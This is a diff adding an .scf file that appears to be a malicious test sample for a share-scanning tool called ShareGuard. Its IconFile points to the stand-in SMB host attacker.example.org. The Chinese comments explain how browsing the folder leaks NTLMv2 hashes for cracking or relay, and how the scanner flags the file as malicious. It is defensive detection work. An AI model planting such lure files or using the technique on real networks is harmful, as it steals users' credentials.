@@ -1,0 +1,18 @@
+[Shell]
+Command=2
+IconFile=\\attacker.example.org\share\favicon.ico
+[Taskbar]
+Command=ToggleDesktop
+
+; ============================================================
+; 强制认证诱饵样本 —— .scf (Shell Command File)
+; 攻击原理:
+;   资源管理器在渲染目录视图(仅是浏览,无需点击)时会读取 IconFile
+;   指定的图标。该路径是攻击者控制的 SMB 服务器,Windows 会自动发起
+;   NTLM 协商并发送当前用户的 NTLMv2 哈希,攻击者用 Responder/Inveigh
+;   捕获后离线破解,或中继到其他系统(NTLM relay)完成登录。
+; ShareGuard 判定:
+;   主机 attacker.example.org 不在 allowedSuffixes / allowedHosts 内
+;   → HostVerdict.External → Severity.Malicious
+; 对照样本:同目录 normal-internal.scf 指向白名单内文件服务器,判 Benign
+; ============================================================
